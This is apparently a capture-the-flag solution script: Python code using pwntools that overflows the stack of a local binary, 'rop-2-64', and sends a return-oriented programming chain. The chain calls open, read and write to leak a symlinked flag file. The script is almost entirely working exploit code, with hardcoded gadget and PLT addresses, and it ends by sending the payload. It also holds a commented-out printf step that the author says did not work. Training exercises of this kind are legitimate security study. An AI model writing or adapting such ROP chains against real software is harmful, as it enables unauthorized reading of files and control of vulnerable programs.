#!/usr/bin/env python

from pwn import *
import os

p = process('./rop-2-64')

buf = "A" * 0x88

"""
0x00000000004004d0  write@plt
0x00000000004004e0  printf@plt
0x00000000004004f0  read@plt
0x0000000000400500  prctl@plt
0x0000000000400510  open@plt
"""

openAddr = p64(0x0000000000400510)
readAddr = p64(0x00000000004004f0)
printAddr = p64(0x00000000004004e0)
writeAddr = p64(0x00000000004004d0)

"""
0x0000000000400588 : pop rbp ; ret
0x0000000000400743 : pop rdi ; ret
0x0000000000400668 : pop rdx ; ret
0x0000000000400741 : pop rsi ; pop r15 ; ret
"""

pop_rdi = p64(0x0000000000400743)
pop_rsi_r15 = p64(0x0000000000400741)
pop_rdx = p64(0x0000000000400668)

flag = p64(0x40083c)
memory = p64(0x601900)

if os.path.exists("0"):
    os.unlink("0")
os.symlink("flag", '0')

#open
buf += pop_rdi
buf += flag
buf += pop_rsi_r15
buf += p64(0)
buf += p64(0)
buf += pop_rdx
buf += p64(0)
buf += openAddr

#read
buf += pop_rdi
buf += p64(3)
buf += pop_rsi_r15
buf += memory
buf += p64(0)
buf += pop_rdx
buf += p64(0x100)
buf += readAddr

#write
buf += pop_rdi
buf += p64(1)
buf += pop_rsi_r15
buf += memory
buf += p64(0)
buf += pop_rdx
buf += p64(0x100)
buf += writeAddr

"""
This doesn't work don't fully understand why it doesn't
#print
buf += pop_rdi
buf += memory
buf += printAddr
"""

with open("exploit.txt", "wb") as f:
    f.write(buf)

p.sendline(buf)
p.interactive()
